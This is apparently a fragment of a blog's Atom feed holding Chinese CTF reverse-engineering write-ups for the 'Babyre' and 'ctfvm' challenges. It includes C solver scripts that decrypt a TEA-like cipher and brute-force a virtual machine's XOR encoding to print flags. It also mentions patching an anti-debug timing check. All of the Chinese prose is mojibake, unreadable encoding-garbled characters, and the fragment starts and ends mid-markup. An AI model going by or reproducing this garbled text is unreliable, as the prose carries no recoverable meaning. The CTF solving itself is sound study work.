class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> key[] = &#123;<span class="number">0xbb</span>, <span class="number">0xa0</span>, <span class="number">0x68</span>, <span class="number">0x13</span>, <span class="number">0x1e</span>, <span class="number">0xce</span>, <span class="number">0x0a</span>, <span class="number">0x19</span></span><br><span class="line">, <span class="number">0x57</span>, <span class="number">0xa3</span>, <span class="number">0xd8</span>, <span class="number">0x35</span>, <span class="number">0x61</span>, <span class="number">0x2c</span>, <span class="number">0xbf</span>, <span class="number">0x26</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">0xf9</span>, <span class="number">0x87</span>, <span class="number">0x50</span>, <span class="number">0xc4</span>, <span class="number">0xb2</span>, <span class="number">0xf2</span>, <span class="number">0x03</span>, <span class="number">0x07</span></span><br><span class="line">, <span class="number">0x3c</span>, <span class="number">0xf4</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x59</span>, <span class="number">0xbb</span>, <span class="number">0xb4</span>, <span class="number">0xed</span></span><br><span class="line">, <span class="number">0x2a</span>, <span class="number">0xb0</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0xf2</span>, <span class="number">0x20</span>, <span class="number">0x85</span>, <span class="number">0x00</span></span><br><span class="line">, <span class="number">0xdd</span>, <span class="number">0x23</span>, <span class="number">0xcd</span>, <span class="number">0xfd</span>, <span class="number">0x75</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0x35</span></span><br><span class="line">, <span class="number">0xd3</span>, <span class="number">0xb6</span>, <span class="number">0xd7</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1b</span>, <span class="number">0xf2</span>, <span class="number">0x74</span></span><br><span class="line">, <span class="number">0x12</span>, <span class="number">0xbf</span>, <span class="number">0x2d</span>, <span class="number">0xcb</span>, <span class="number">0xf6</span>, <span class="number">0x53</span>, <span class="number">0xb4</span>, <span class="number">0xa4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(*((unsigned int *)(enc+8*i)) &gt;&gt; 5)+*((unsigned int *)key+3)^delat+*((unsigned int *)(enc+8*i))*(*((unsigned int *)(enc+8*i)))^0x10+*((unsigned int *)key+2)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> delat = <span class="number">3816266640</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>) -= (*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">3</span>)^delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))^(*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">2</span>);</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))) -= (*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)+<span class="number">1</span>)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">1</span>)^delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>)^(*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">0</span>);</span><br><span class="line">delat += <span class="number">0x61c88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åšäº†3ä¸ªReï¼Œä»ä¸­æ„Ÿè§‰è‡ªå·±pythonè¿ç”¨èƒ½åŠ›ä¸è¡Œï¼Œå…¶æ¬¡å¯¹å¸¸è§çš„ä¸€äº›ç®—æ³•æ€§è´¨ä¸è¿‡å…³ï¼Œä¹‹å‰æŠŠz3æƒ³æˆä¸‡èƒ½çš„äº†ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªé¢˜å› ä¸ºz3æ‰¾ä¸åˆ°è§£æˆ‘å°±ä»¥ä¸ºæ— è§£ã€‚ã€‚å½“æ—¶å°±æƒ³ä¸é€šäº†ã€‚æœ€åå‘ç°å¤§å®¶é‚£ä¸ªé¢˜çˆ†ç ´æ¥åšçš„æ¯”è¾ƒå¤šã€‚ã€‚å…¶æ¬¡å°±æ˜¯åœ¨ä¸€ä¸ªæœ‰é™åŸŸæ±‚é€†çŸ©é˜µç„¶åç›¸ä¹˜å°±å¥½äº†ï¼Œä¹Ÿå°±æ˜¯hillåŠ å¯†ã€‚å¤§ä¸€è¿˜å­¦è¿‡çº¿æ€§ä»£æ•°çš„ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå°±æ˜¯ä¸€ä¸ªé¢˜å†™ä¸€ä¸ªdfsè„šæœ¬èŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œå¯¹python3çš„è¯»å†™æ–‡ä»¶â€œwbâ€ä¸â€œwâ€æ¨¡å¼æ²¡æœ‰äº†è§£ï¼Œè¿™æ¬¡è¿ç”¨å°±æš´éœ²å‡ºäº†é—®é¢˜ã€‚ã€‚ä¸”è¿™åœ¨python2ä¸python3ä¸­ä¹Ÿæœ‰åŒºåˆ«ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åå¤šçº¿ç¨‹çˆ†ç ´ç¡®å®æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚æœç´¢ç®—æ³•è¦å¥½å¥½å­¦ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;é˜Ÿä¼29åï¼ŒåŠ æ²¹ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>ç¬¬å…­å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <link href="https://www.bxnop.cn/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2020-11-15T14:40:50.000Z</published>
    <updated>2021-04-18T01:27:05.360Z</updated>
    
    <content type="html"><![CDATA[<p>2ä¸ªè™šæ‹Ÿæœºç±»å‹çš„é¢˜ç›®ã€‚å¾ˆé«˜å…´è¿›äº†çº¿ä¸‹ï¼Œé˜Ÿä¼æœ€åç¬¬2å/ã€‚<a id="more"></a></p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/909254_NE362J9P4YSEMAR.png" alt="909254_NE362J9P4YSEMAR"></p><h3 id="çœŸæ­£çš„Babyre"><a href="#çœŸæ­£çš„Babyre" class="headerlink" title="çœŸæ­£çš„Babyre"></a>çœŸæ­£çš„Babyre</h3><p>idaå¼€å§‹ç›´æ¥æœç´¢å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œç®€å•ä¿®å¤ä¸€ä¸‹æ ˆæŒ‡é’ˆï¼Œç›´æ¥F5ã€‚</p><p>å¼€å§‹æ€»æ„Ÿè§‰è‡ªå·±çœ‹åˆ°çš„æ˜¯å‡çš„æµç¨‹ï¼ŒæŠŠç¨‹åºç¿»äº†ä¸ªéï¼Œæ²¡å‘ç°å…¶å®ƒçš„æµç¨‹ï¼Œä½†æ˜¯å‘ç°äº†å‡ ä¸ªåè°ƒè¯•ï¼Œä½†æ˜¯è°ƒè¯•å‘ç°ç¨‹åºéƒ½æ²¡æœ‰ä½¿ç”¨ã€‚ã€‚ã€‚å…¶ä¸­äºŒä¸ªï¼š</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201115110658656-1605414968987.png" alt="image-20201115110658656"></p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114231613090-1605451277739.png" alt="image-20201114231613090"></p><p>ç„¶åç¡®å®šè¿™å°±æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºé€†å‘ã€‚é™æ€åˆ†æä¸€ä¸‹åç›´æ¥è®©ç¨‹åºè·‘èµ·æ¥ã€‚</p><p>è¿™é‡Œæˆ‘åšçš„æ—¶å€™å’Œå¤ç°çš„æ—¶å€™ï¼Œidaè¯†åˆ«çš„ç«Ÿç„¶ä¸ä¸€æ ·ï¼Œå¤ç°åˆ†æçš„æ›´ç®€æ´ã€‚è®°å¾—åšçš„æ—¶å€™ï¼Œæ¯æ¬¡èµ‹å€¼æ“ä½œç ä¸æ•°æ®çš„æ—¶å€™æ˜¯ä½¿ç”¨ä¸€ä¸ªå››å­—èŠ‚æ•°æ®æ¥ä¿å­˜çš„ï¼Œå…¶ä¸­L0BYTEï¼ŒByte1ï¼ŒByte2ï¼ŒHIByteéƒ½æ˜¯ä¸åŒçš„å«ä¹‰ï¼š</p><p>åšçš„æ—¶å€™çš„ä¸€äº›ç¬”è®°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æµ‹è¯•flagã€‚</span></span><br><span class="line">flag&#123;<span class="number">0123456789012345678901234567890</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ€åæ¯”è¾ƒçš„æ•°æ®ã€‚</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">31</span>,  <span class="number">24</span>,  <span class="number">15</span>, <span class="number">250</span>, <span class="number">184</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">137</span>,  <span class="number">24</span>, <span class="number">104</span>, </span><br><span class="line">  <span class="number">124</span>,  <span class="number">25</span>,  <span class="number">20</span>,  <span class="number">45</span>, <span class="number">125</span>,  <span class="number">88</span>,   <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">84</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">60</span>,  <span class="number">54</span>,  <span class="number">62</span>,  <span class="number">86</span>,  <span class="number">19</span>,   <span class="number">4</span>,  <span class="number">59</span>,  <span class="number">46</span>,  <span class="number">75</span>, </span><br><span class="line">  <span class="number">121</span>,  <span class="number">67</span>, <span class="number">122</span>,  <span class="number">34</span>,  <span class="number">69</span>, <span class="number">110</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">38</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">192</span>, <span class="number">142</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOBYTEï¼š%<span class="number">64</span> index</span><br><span class="line">BYTE2: å¼€å§‹ä¸LOBYTEå€¼ç›¸åŒï¼Œåšè¿ç®—å®Œçš„èµ‹å€¼index</span><br><span class="line">BYTE1: xor input[]  opcode: <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¼šBYTE1 &amp;= LOBYTE;</span><br></pre></td></tr></table></figure><p>ç„¶åç¨‹åºä¸­ä½¿ç”¨äº†çš„ä¸€ä¸ªåè°ƒè¯•ï¼ˆæ—¶é’Ÿæ£€æµ‹ï¼‰ï¼šç®€å•patchäº†å³å¯ã€‚</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201115001246130-1605451277740.png" alt="image-20201115001246130"></p><p>ä¹ä¸€çœ‹ç¨‹åºæµç¨‹æœ‰ç‚¹å¤æ‚ï¼Œæ„Ÿè§‰è¾“å…¥çš„æ•°æ®ä¼šåº”è¯¥ä¸‹ä¸€æ­¥æ“ä½œç ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯ä¸€ä¸ªåŠ å¯†æ“ä½œã€‚</p><p>æ€»ç»“ä¸€ä¸‹ç¨‹åºçš„åŠ å¯†æ“ä½œï¼ˆå¯¹æ‰€æœ‰å­—ç¬¦ä¸²çš„åŠ å¯†éƒ½æ˜¯è¿™ä¸ªæ“ä½œï¼‰ï¼šé¦–å…ˆä»æ“ä½œç ä¸­å–å‡ºä¸€ä¸ªæ•°æ®<strong>op_data</strong> ï¼Œç„¶åtemp  = input[i]^op_dataï¼Œå†è®©op_data &amp;= input[i]ï¼Œinput[i] = tempï¼Œä¸€ç›´è¿™ä¸ªå¾ªç¯ç›´åˆ°op_data == 0ï¼Œæœ€åå–å‡ºinput[i+1]è¿›è¡Œinput[i] ^= input[i+1]ã€‚ä¸€ç›´è¿™æ ·å¯¹æ‰€æœ‰çš„inputåŠ å¯†2éï¼Œå°±æ˜¯ä½¿ç”¨op_dataä¸åŒã€‚</p><p>ä½¿ç”¨ida_pythonå¯¼å‡ºæˆ‘ä»¬è¦ç”¨çš„op_dataã€‚</p><p>æŒ‰ç…§ç¨‹åºçš„ç®—æ³•ï¼Œé€†äºŒæ¬¡å³å¯ï¼šç¬¬ä¸€æ¬¡è§£å¯†è¿‡ç¨‹æˆ‘è¿›è¡Œäº†æ³¨é‡Šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">31</span>,  <span class="number">24</span>,  <span class="number">15</span>, <span class="number">250</span>, <span class="number">184</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">137</span>,  <span class="number">24</span>, <span class="number">104</span>, </span><br><span class="line">  <span class="number">124</span>,  <span class="number">25</span>,  <span class="number">20</span>,  <span class="number">45</span>, <span class="number">125</span>,  <span class="number">88</span>,   <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">84</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">60</span>,  <span class="number">54</span>,  <span class="number">62</span>,  <span class="number">86</span>,  <span class="number">19</span>,   <span class="number">4</span>,  <span class="number">59</span>,  <span class="number">46</span>,  <span class="number">75</span>, </span><br><span class="line">  <span class="number">121</span>,  <span class="number">67</span>, <span class="number">122</span>,  <span class="number">34</span>,  <span class="number">69</span>, <span class="number">110</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">38</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">192</span>, <span class="number">142</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a1[] = &#123;<span class="number">9</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">9</span>,</span><br><span class="line">  <span class="number">14</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">13</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">12</span>,</span><br><span class="line">   <span class="number">13</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">10</span>&#125;;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c[] = &#123;<span class="number">3</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">228</span>, <span class="number">95</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">113</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">5</span>, <span class="number">94</span>, <span class="number">2</span>, <span class="number">72</span>, <span class="number">105</span>, <span class="number">91</span>, <span class="number">86</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">84</span>, <span class="number">37</span>, <span class="number">14</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">88</span>, <span class="number">123</span>, <span class="number">65</span>, <span class="number">135</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*int i = 0, j = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ida_chars[41] = 135;</span></span><br><span class="line"><span class="comment">for(j = 40; j &gt;= 0; j--)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">ida_chars[j] ^= ida_chars[j+1];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 255; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">unsigned char temp = i, temp1 = i;</span></span><br><span class="line"><span class="comment">unsigned char a = b[j];</span></span><br><span class="line"><span class="comment">while(1)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">temp1 ^= a;</span></span><br><span class="line"><span class="comment">a &amp;= temp;</span></span><br><span class="line"><span class="comment">a *= 2;</span></span><br><span class="line"><span class="comment">temp = temp1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if(a == 0)</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if(temp == ida_chars[j])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">ida_chars[j] = i;</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 42; i++)</span></span><br><span class="line"><span class="comment">printf("%d, ", ida_chars[i]);*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">c[<span class="number">41</span>] = <span class="number">125</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">40</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">c[j] ^= c[j+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i, temp1 = i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a = a1[j];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp1 ^= a;</span><br><span class="line">a &amp;= temp;</span><br><span class="line">a *= <span class="number">2</span>;</span><br><span class="line">temp = temp1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(temp == c[j])</span><br><span class="line">&#123;</span><br><span class="line">c[j] = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, c[i]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;e1750505-7a05-4de9-a333-72ec8cd26a78&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ctfvm"><a href="#ctfvm" class="headerlink" title="ctfvm"></a>ctfvm</h3><p>ä»é¢˜ç›®åå­—å¯çŸ¥é“æ˜¯è™šæ‹Ÿæœºé€†å‘ã€‚åœ¨linuxä¸­è¿è¡Œä¸€ä¸‹ï¼Œçœ‹è§å­—ç¬¦ä¸²ä¿¡æ¯ã€‚</p><p>idaä¸­æœç´¢ä¸€åœˆå¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›¸å…³å­—ç¬¦ä¸²ï¼Œé‚£å°±æ˜¯ç¨‹åºè¿è¡Œæ—¶è§£å¯†å‡ºç›¸å…³å­—ç¬¦ä¸²ã€‚ä»å…¥å£ç‚¹æ‰¾åˆ°mainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°464è¡Œçš„ä»£ç ï¼Œåˆ†æ”¯æå…¶å¤šã€‚ã€‚<img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114224414324-1605451277740.png" alt="image-20201114224414324"></p><p>é™æ€åˆ†ææ˜¯ä¸å¯èƒ½äº†ï¼Œç›´æ¥åŠ¨è°ƒã€‚</p><p>å¼€å§‹æ…¢æ…¢çš„è°ƒè¯•çœ‹å“ªé‡Œè§£å¯†å­—ç¬¦ä¸²çš„ï¼Œä½†å®åœ¨æ˜¯å†—é•¿ï¼Œç›´æ¥åœ¨whileå¾ªç¯ä¸‹æ–­ï¼Œç„¶åF9ä¸€ç›´è·‘ï¼Œç›´åˆ°ç¨‹åºç­‰å¾…æˆ‘ä»¬è¾“å…¥ã€‚</p><p>éšä¾¿è¾“å…¥åï¼Œå¼€å§‹æ…¢æ…¢è·Ÿè¿›ç†Ÿæ‚‰ä¸€äº›å‡½æ•°çš„åŠŸèƒ½ï¼Œå‘ç°å¼€å§‹å°±æ˜¯åœ¨ä»¥æ­¤å–æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å­˜å…¥ä¸€ä¸ªå¤§æ•°ç»„ä¸­</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114225040904-1605451277740.png" alt="image-20201114225040904"></p><p>ç»§ç»­è·Ÿè¸ªï¼Œåˆ†æåˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦é•¿åº¦è¦æ˜¯38ï¼Œè™½ç„¶è¯»å–äº†æœ€åçš„å›è½¦ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰ä½¿ç”¨çš„ã€‚</p><p>å…¶ä¸­ç¨‹åºä¸­è¿™ä¸ªå†…å­˜åŒºåŸŸç±»ä¼¼å°±æ˜¯vmä½¿ç”¨çš„å¯„å­˜å™¨ã€‚</p><p><img 